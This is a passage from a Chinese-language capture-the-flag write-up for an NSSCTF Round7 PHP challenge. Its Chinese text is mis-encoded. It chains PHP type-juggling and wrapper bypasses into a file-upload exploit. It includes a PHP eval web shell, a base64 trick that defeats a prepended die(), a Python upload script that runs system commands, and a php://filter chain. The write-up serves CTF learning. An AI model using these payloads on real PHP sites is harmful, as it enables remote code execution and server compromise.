class="hljs-string">&quot;NSSRound7&quot;</span>;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nss</span> &amp;&amp; <span class="hljs-variable">$nSscTF</span> === <span class="hljs-string">&quot;NSSRound7&quot;</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>                            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>                            <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&quot;.png&quot;</span>) == <span class="hljs-literal">false</span>)&#123;<br>                                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);<br>                            &#125;<br>                            <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br>                            <span class="hljs-variable">$real_content</span> = <span class="hljs-string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="hljs-variable">$content</span> . <span class="hljs-string">&#x27;?&gt;&#x27;</span>;<br>                            <span class="hljs-variable">$real_name</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>                            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$real_name</span>, <span class="hljs-variable">$real_content</span>);<br>                            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$real_name</span>);<br>                            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OoO0o0hhh.&quot;</span>;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NoO0oO0oO0!&quot;</span>);<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;N0o0o0oO0o!&quot;</span>);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NoOo00O0o0!&quot;</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Noo0oO0oOo!&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO0o0oO0oO!&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No0o0o000O!&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO0o0o0o0o!&quot;</span>);<br>&#125; NO0o0o0o0o!<br></code></pre></td></tr></table></figure><ol><li><p>ç¬¬ä¸€å±‚æ•°ç»„ç»•è¿‡ï¼Œ<code>NSSCTF[]=1&amp;NSSCTF[]=2</code></p></li><li><p>ç¬¬äºŒå±‚æ˜¯in_array()ç¬¬ä¸‰ä¸ªå‚æ•°æ²¡æœ‰ç›´æ¥strictå¯¼è‡´å¯ä»¥ç»•è¿‡ï¼Œ<code>NsScTF=1q</code></p></li><li><pre><code class="hljs">if (file_get_contents($NsScTf) === &quot;Welcome to Round7!!!&quot;) <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>åœ¨phpæ‰‹å†Œä¸­æŸ¥è¯¢ <span class="hljs-strong">**file<span class="hljs-emphasis">_get_</span>contents()**</span> å‡½æ•°çš„ä½œç”¨ï¼š<br><br><span class="hljs-strong">**file<span class="hljs-emphasis">_get_</span>contents()**</span> å‡½æ•°æ˜¯ç”¨æ¥å°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæ“ä½œç³»ç»Ÿæ”¯æŒè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚<br><br><span class="hljs-quote">&gt; <span class="hljs-strong">**æ³¨æ„**</span>:</span><br><span class="hljs-quote">&gt;</span><br><span class="hljs-quote">&gt; å¦‚æœè¦æ‰“å¼€æœ‰ç‰¹æ®Šå­—ç¬¦çš„ URL ï¼ˆæ¯”å¦‚è¯´æœ‰ç©ºæ ¼ï¼‰ï¼Œå°±éœ€è¦ä½¿ç”¨ [<span class="hljs-string">urlencode()</span>](<span class="hljs-link">https://www.php.net/manual/zh/function.urlencode.php</span>) è¿›è¡Œ URL ç¼–ç ã€‚</span><br><br>æ˜¾ç„¶æˆ‘ä»¬æ²¡åŠæ³•ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯èƒ½ç»™å‚æ•°ä¼ urlæƒ³åˆ°phpä¼ªåè®®<br><br><span class="hljs-code">`data://`</span> ä¼šæŠŠ URI ä¸­çš„æ•°æ®å½“ä½œâ€œæ–‡ä»¶å†…å®¹â€è¯»å‡ºã€‚ä¹Ÿå°±æ˜¯è¯´<span class="hljs-code">`file_get_contents(&#x27;data://text/plain,Welcome to Round7!!!&#x27;)`</span> ä¼šç›´æ¥è¿”å›å­—ç¬¦ä¸² <span class="hljs-code">`Welcome to Round7!!!`</span>ï¼Œå› æ­¤å¯ä»¥ç»•è¿‡å¯¹â€œçœŸå®æ–‡ä»¶è·¯å¾„â€çš„æœŸå¾…ã€‚<br><br><span class="hljs-bullet">4.</span> <br><br></code></pre></td></tr></table></figure>if (isset($_GET[&#39;nss_ctfer.vip&#39;])) &#123;<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>   è¿˜æ˜¯è€ƒçš„phpç‰¹æ€§ï¼Œéƒ½æœ‰ç‚¹å¿˜äº†<br><br>è¿™æ˜¯phpä¸­çš„éæ³•å‚æ•°åä¼ å‚ï¼š<br><br><span class="hljs-title">![PixPin_2025-11-05_20-35-14](https:</span>//raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-<span class="hljs-number">11</span>-<span class="hljs-number">05</span>_20-<span class="hljs-number">35</span>-<span class="hljs-number">14</span>.png)<br><br>å› æ­¤æˆ‘ä»¬æ˜¯æ²¡åŠæ³•ç›´æ¥ä¼ å…¥`nss_ctfer.vip`çš„ï¼Œä¼šè¢«æ›¿æ¢æˆ`nss_ctfer_vip`ï¼Œä½†æ˜¯phpä¸­è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå¦‚æœä¼ å…¥`[`ï¼Œå®ƒè¢«è½¬åŒ–ä¸º`_`ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºæ¥è¯¥å˜é‡åå’¯ã€‚<br><br></code></pre></td></tr></table></figure>nss[ctfer.vip<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">5</span>. ```<br>   <span class="hljs-attribute">if</span> ($NSScTf != <span class="hljs-number">114514</span> &amp;&amp; intval($NSScTf, <span class="hljs-number">0</span>) === <span class="hljs-number">114514</span>) &#123;<br></code></pre></td></tr></table></figure>ç¬¬äº”å±‚æ˜¯intval()ç»•è¿‡ï¼Œå­—ç¬¦ä¸²ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œä¼šé»˜è®¤æ˜¯å‰é¢çš„æ•°å­—ï¼Œæ¯”å¦‚â€™1e1â€™è½¬åŒ–å˜æˆ1ï¼ŒNSScTf=114514e1ï¼Œç¬¬äº”å±‚ç›´æ¥`nSScTF=1ï¼Œ$nSscTF=NSSRound7`ã€‚</code></pre></li><li><pre><code class="hljs">if ($nss &amp;&amp; $nSscTF === &quot;NSSRound7&quot;) &#123;                        if (isset($_POST[&#39;submit&#39;])) &#123;<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>ç›´æ¥æ„é€ ï¼š`nSScTF=<span class="hljs-number">1</span>&amp;nSscTF=NSSRound7` è®°å¾—æäº¤submit,<br><br>å¾—åˆ°è¿™ä¸€éƒ¨åˆ†payload<br><br></code></pre></td></tr></table></figure>?NSSCTF[]=1&amp;NsSCTF[]=2&amp;NsScTF=1a&amp;NsScTf=data://text/plain,Welcome%20to%20Round7!!!&amp;nss[ctfer.vip=&amp;NSScTf=114514.3&amp;nSScTF=1&amp;nSscTF=NSSRound7POST:submit=1<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>ä»¥ä¸Šå…¨éƒ¨éƒ½æ˜¯phpç‰¹æ€§ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹[PHP ç‰¹æ€§ - Hello CTF](https:<span class="hljs-comment">//hello-ctf.com/hc-tags/web/PHP_features/#0e-bypass)ã€‚æ¥ç€å¾€ä¸‹çœ‹ã€‚</span><br><br>è¿™é‡Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ <br><br>```php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$path</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&quot;.png&quot;</span>) == <span class="hljs-literal">false</span>)&#123;<br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-variable">$real_content</span> = <span class="hljs-string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="hljs-variable">$content</span> . <span class="hljs-string">&#x27;?&gt;&#x27;</span>;<br><span class="hljs-variable">$real_name</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$real_name</span>, <span class="hljs-variable">$real_content</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$real_name</span>);<br></code></pre></td></tr></table></figure></code></pre></li></ol><p>ä¸Šè¿°ä»£ç é€šè¿‡<code>strops()</code>æ£€æµ‹æ–‡ä»¶çš„åç§°æ˜¯å¦å­˜åœ¨pngï¼Œä½†è¿™ç§å†™æ³•ä¸ä¸¥è°¨â€”â€” <code>evil.png.php</code> ä¹Ÿä¼šé€šè¿‡æ£€æŸ¥ã€‚</p><p>å…³é”®æ˜¯ä¼šå°†<code>&lt;?php die(â€œRound7 do you likeâ€);</code>ä¸æˆ‘ä»¬ä¼ çš„phpæ‹¼æ¥ï¼Œå°±å¯¼è‡´äº†å¦‚æœç›´æ¥åœ¨æµè§ˆå™¨è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼ŒPHP ä¼šç«‹å³åœæ­¢æ‰§è¡Œã€‚</p><p>ä¸€ä¸ªæ€è·¯æ˜¯åœ¨è§£ç æ—¶å°†æ­»äº¡ä»£ç ç»™è§£ç æˆä¹±ç ï¼Œä½¿å…¶æ— æ³•ä½œç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;attack&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br>baseç¼–ç Â·ï¼š<br>PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Round7 do you like&quot;</span>);aaaPD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+<span class="hljs-meta">?&gt;</span><br>è¿™é‡Œè¦è¡¥ä¸‰ä¸ªå­—æ¯aaaï¼Œå› ä¸ºphpè§£ç æ—¶æ˜¯å››ä¸ªbyteä¸€ç»„<br></code></pre></td></tr></table></figure><p>è¿™æ ·ä¼ åç»­æˆ‘ä»¬ä½¿ç”¨<code>php://filter/convert.base64-decode</code>è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå‰é¢çš„dieè¢«è§£é‡Šä¸ºä¹±ç å°±æ²¡åŠæ³•æ‰§è¡Œäº†ã€‚</p><p>åç»­æˆ‘ä»¬å†™ä¸ªè„šæœ¬å®ç°ä¸Šè¿°æ‰€æœ‰ä¼ å‚å’Œæ–‡ä»¶ä¸Šä¼ æ“ä½œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br><span class="hljs-keyword">from</span> base64 import b64encode<br>import re<br> <br>def <span class="hljs-title function_ invoke__">get_flag</span>(URL):<br>    url = f<span class="hljs-string">&quot;&#123;URL&#125;/Ns_SCtF.php?NSSCTF[]=1&amp;NsSCTF[]=2&amp;NsScTF=1%00&amp;NsScTf=data://text/plain,Welcome%20to%20Round7!!!&amp;nss[ctfer.vip=true&amp;NSScTf=114514e1&amp;nSScTF=1&amp;nSscTF=NSSRound7&quot;</span><br>    data = &#123;<span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-number">1</span>&#125;<br> <br>    payload = <span class="hljs-title function_ invoke__">str</span>(<span class="hljs-title function_ invoke__">b64encode</span>(b<span class="hljs-string">&quot;&lt;?php system(&#x27;cat /home/f1ag&#x27;);?&gt;&quot;</span>)) <span class="hljs-comment">#ä¿®æ”¹ä¸ºè‡ªå·±æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤</span><br>    payload = re.<span class="hljs-title function_ invoke__">findall</span>(r<span class="hljs-string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,payload)[<span class="hljs-number">0</span>]<br> <br>    file1 = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.png.php&#x27;</span>, f<span class="hljs-string">&quot;aaa&#123;payload&#125;&quot;</span>)&#125;<br>    file2 = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%31%2e%70%6e%67%2e%70%68%70&#x27;</span>, f<span class="hljs-string">&quot;aaa&#123;payload&#125;&quot;</span>)&#125;<br> <br>    requests.<span class="hljs-title function_ invoke__">post</span>(url,data=data,files=file1)<br>    requests.<span class="hljs-title function_ invoke__">post</span>(url,files=file2,data=data)<br>    nssctf_text3 = requests.<span class="hljs-title function_ invoke__">post</span>(f<span class="hljs-string">&#x27;&#123;URL&#125;/1.png.php&#x27;</span>).text<br>    <span class="hljs-keyword">print</span>(nssctf_text3)<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-title function_ invoke__">get_flag</span>(<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">#è¿™é‡Œè¾“å…¥url</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-11-06_18-02-38.png" alt="PixPin_2025-11-06_18-02-38"></p><p>ä½†æ˜¯å…¶å®ä¸€å¼€å§‹å¦‚æœæ²¡æœ‰ç›®å½•æ‰«æçš„è¯è¿˜æœ‰ä¸€ä¸ªlevel1level2ã€‚</p><p>è¯·æ±‚å¤´æœ‰ä¸€ä¸ªå‚æ•°ï¼Œæç¤ºæˆ‘ä»¬getä¼ å‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-11-06_18-11-16.png" alt="PixPin_2025-11-06_18-11-16"></p><p>ä¼ å‚åå¾—åˆ°ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;get:S0uRc3&#x27;</span>);  <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-title function_ invoke__">set_include_path</span>(<span class="hljs-string">&#x27;Round7/&#x27;</span>);  <br><span class="hljs-comment">// include: Nss  </span><br><span class="hljs-comment">// include: level2  </span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;0o0&#x27;</span>])) &#123;    <br>    <span class="hljs-variable">$O0O</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;0o0&#x27;</span>],<span class="hljs-number">1</span>);  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$O0O</span>, <span class="hljs-string">&#x27;Round7&#x27;</span>) === <span class="hljs-number">0</span>) &#123;  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;NO!!!!!   Permission denied!&#x27;</span>);   <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$O0O</span>, <span class="hljs-string">&#x27;Xy1on&#x27;</span>) === <span class="hljs-number">0</span>) &#123;  <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$O0O</span>;  <br>        <span class="hljs-keyword">die</span>();  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Nothing!!!&quot;</span>);  <br>    &#125;  <br>&#125;  <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;S0uRc3&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br>    <span class="hljs-variable">$O0O</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;CTF&#x27;</span>,<span class="hljs-number">1</span>);  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$O0O</span>;  <br>&#125;<span class="hljs-keyword">else</span>&#123;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Nothing here&quot;</span>;  <br>      <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿›è¡Œä»£ç å®¡è®¡ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;0o0&#x27;</span>])) &#123;    <br>    <span class="hljs-variable">$O0O</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;0o0&#x27;</span>],<span class="hljs-number">1</span>);  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$O0O</span>, <span class="hljs-string">&#x27;Round7&#x27;</span>) === <span class="hljs-number">0</span>) &#123;  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;NO!!!!!   Permission denied!&#x27;</span>);   <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$O0O</span>, <span class="hljs-string">&#x27;Xy1on&#x27;</span>) === <span class="hljs-number">0</span>) &#123;  <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$O0O</span>;  <br>        <span class="hljs-keyword">die</span>();  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Nothing!!!&quot;</span>);  <br>    &#125;  <br>&#125;  <br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ä¼ å…¥<code>$_GET[&#39;0o0&#39;]</code>è€Œä¸”ï¼Œå‚æ•°é€šè¿‡<code>strpos</code>æ ¡éªŒå¼€å¤´ä¸èƒ½æ˜¯<code>Round7</code>å¿…é¡»æ˜¯<code>Xy1on</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$O0O</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;0o0&#x27;</span>],<span class="hljs-number">1</span>);  <br></code></pre></td></tr></table></figure><p>è¿™ä¸€å¥ä»£ç ä¸­ï¼Œ<code>1</code>ä»£è¡¨ç”¨äº†å¸¸é‡ <strong><code>FILE_USE_INCLUDE_PATH</code></strong> ç”¨äºè§¦å‘æœç´¢ <code>include path</code>ï¼Œå‰é¢çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">set_include_path</span>(<span class="hljs-string">&#x27;Round7/&#x27;</span>);  <span class="hljs-comment">#æŠŠinclude_pathè®¾æˆRound7</span><br></code></pre></td></tr></table></figure><p>å½“ä½ ä¼  <code>?0o0=xxx</code> æ—¶ï¼Œä»£ç ä¼šè¯»å…¥ <code>xxx</code> æŒ‡å‘çš„èµ„æºå†…å®¹åˆ° <code>$O0O</code>ã€‚</p><blockquote><p>é‡è¦ï¼šå¦‚æœ <code>xxx</code> æ˜¯ <strong>ç›¸å¯¹è·¯å¾„</strong>ï¼ˆå¦‚ <code>level2</code>ï¼‰ï¼Œå®ƒä¼šåœ¨ <code>Round7/level2</code> è¯»å–ã€‚<br> ä½†å¦‚æœ <code>xxx</code> æ˜¯ <strong>æµå°è£…å™¨</strong>ï¼ˆå¦‚ <code>php://filter/.../resource=level2</code>ã€<code>data://...</code>ï¼‰ï¼Œåˆ™ä¸å†èµ° include_path çš„ç›¸å¯¹æŸ¥æ‰¾è§„åˆ™ï¼Œç›´æ¥æŒ‰å°è£…å™¨å¤„ç†ã€‚è¿™æ­£æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚</p></blockquote><p>æƒ³è¦è¯» <code>/flag</code> çš„å†…å®¹ï¼Œä½†è„šæœ¬åªä¼šåœ¨<strong>è¾“å‡ºå†…å®¹çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹å°±æ˜¯ <code>Xy1on</code></strong> æ—¶æ‰æŠŠå†…å®¹å›æ˜¾ã€‚</p><p>æ˜¾ç„¶ï¼Œ<code>/flag</code> æ–‡ä»¶çš„çœŸå®å†…å®¹ä¸å¯èƒ½å¤©ç„¶ä»¥ <code>Xy1on</code> å¼€å¤´ï¼›æˆ‘ä»¬éœ€è¦â€œæƒ³åŠæ³•è®©<strong>è¾“å‡º</strong>çœ‹èµ·æ¥ä»¥ <code>Xy1on</code> å¼€å¤´â€ï¼Œè€Œä¸æ˜¯æ”¹åŸæ–‡ä»¶ã€‚</p><p><code>php://filter</code> æ˜¯ PHP çš„<strong>æµè¿‡æ»¤å™¨</strong>å°è£…å™¨ï¼Œå…è®¸åœ¨â€œè¯»å–èµ„æºâ€æ—¶ï¼Œå¯¹å­—èŠ‚æµåšä¸€ä¸²<strong>å¯ç»„åˆçš„è½¬ç &#x2F;ç¼–è§£ç &#x2F;æ›¿æ¢</strong>æ“ä½œï¼ˆfilter chainï¼‰ã€‚å½¢å¼å¤§æ¦‚æ˜¯ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">php://filter/read=<span class="hljs-tag">&lt;<span class="hljs-name">è¿‡æ»¤å™¨1</span>&gt;</span>|<span class="hljs-tag">&lt;<span class="hljs-name">è¿‡æ»¤å™¨2</span>&gt;</span>|.../resource=<span class="hljs-tag">&lt;<span class="hljs-name">çœŸæ­£çš„èµ„æº</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬èƒ½æ‰¾åˆ°ä¸€ä¸²è¿‡æ»¤å™¨ï¼Œä½¿å¾—â€œ<code>level2</code> çš„åŸå§‹å†…å®¹ â†’ ç»è¿‡è¿‡æ»¤å™¨é“¾çš„<strong>è¾“å‡º</strong>â€çš„<strong>å‰ç¼€</strong>æ°å¥½å˜æˆ <code>Xy1on</code>ï¼Œå°±èƒ½è§¦å‘ <code>echo $O0O;</code> äº†ã€‚</p><p><strong>Synacktiv çš„ php_filter_chain_generator</strong>ã€‚å®ƒèƒ½é’ˆå¯¹ä¸€ä¸ªæƒ³è¦çš„<strong>ç›®æ ‡å‰ç¼€</strong>ï¼ˆä¾‹å¦‚ <code>Xy1on</code>ï¼‰è‡ªåŠ¨æœä¸€æ¡å¯è¡Œçš„è¿‡æ»¤å™¨é“¾ï¼ŒæŠŠå®é™…æ–‡ä»¶å†…å®¹â€œå˜å½¢â€æˆä»¥è¿™ä¸ªå‰ç¼€å¼€å¤´çš„è¾“å‡ºã€‚</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><p>ç”Ÿæˆfilteré“¾</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251107181156531.png" alt="image-20251107181156531"></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">php://filter/convert.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP866.CSUNICODE|<span class="hljs-type">convert</span>.iconv.CSISOLATIN5.ISO_6937<span class="hljs-number">-2</span>|<span 